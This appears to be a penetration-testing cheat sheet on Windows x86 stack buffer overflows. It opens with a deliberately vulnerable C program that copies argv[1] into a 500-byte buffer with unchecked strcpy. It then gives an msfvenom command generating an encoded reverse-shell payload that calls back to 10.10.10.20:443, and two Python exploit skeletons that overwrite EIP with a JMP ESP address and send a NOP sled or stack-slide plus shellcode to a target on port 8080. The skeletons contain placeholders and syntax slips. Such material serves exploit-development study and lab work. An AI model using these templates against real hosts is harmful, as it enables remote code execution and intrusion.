# Windows Stack Buffer Overflow

## Stack Buffer Overflow

### Vulnerable Codes

In C the main function is treated as any other function. The main function is called by the OS when the process starts

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buffer[500];
	
	if (argc < 2)
	{
		printf("Error - You must supply at least one argument\n");
		return 1;
	}
	
	strcpy(buffer, argv[1]);
	
return 0;
}

```

Buffer Explained:

* char buffer\[500\]= local variable able to store 500 characters.
* strcpy\(buffer, argv\[1\]\) = copy the contents of the given argument into the buffer character array.

Parameters Explained: 

* int argc = number of arguments passed to the program. 
* \*argv\[\] = array of pointers to the argument "strings" themselves.

More information on argv:

{% embed url="https://stackoverflow.com/questions/16666353/what-does-char-argv-means" %}

_**Why is this Vulnerable?**_

Is vulnerable because it doesn't check the size of the buffer which can overflow the array boundaries.

## x86 Stack Buffer Overflow

### x86 Msfvenom Template

```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.20 LPORT=443 -b "\x00" -e x86/shikata_ga_naiÂ -f c EXITFUNC=thread
```

### x86 Stack Buffer Overflow Skeleton

#### NOP Skeleton

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Global
target = 10.10.10.10

def exploit():
    # Shellcode in Bytes
    shellcode = (b"<shellcode>")

    # Payload in Bytes
    offset = 1052
    before_eip = b"A"*offset # 1052 A
    eip = pack("<I", <address>) # JMP ESP
    nops = "\x90"*16 # 16 NOPs
    
    payload = before_eip + eip + nops + shellcode
    
    # Socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 8080)) # Connect to the target on port 8080
    s.send(payload) # Send the payload
    
    
    
if __name__ == "__main__"
    exploit()
```

#### Stack Slide Skeleton \(Alternative to NOPs\)

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Global
target = 10.10.10.10

def exploit():
    # Shellcode in Bytes
    shellcode = (b"<shellcode>")

    # Payload in Bytes
    offset = 1052
    before_eip = b"A"*offset # 1052 A
    eip = pack("<I", <address>) # JMP ESP
    # SUB ESP, 0x10
    payload = before_eip + eip + b"\x83\xec\x10" + shellcode
    
    # Socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 8080)) # Connect to the target on port 8080
    s.send(payload) # Send the payload
    
    
    
if __name__ == "__main__"
    exploit()
```

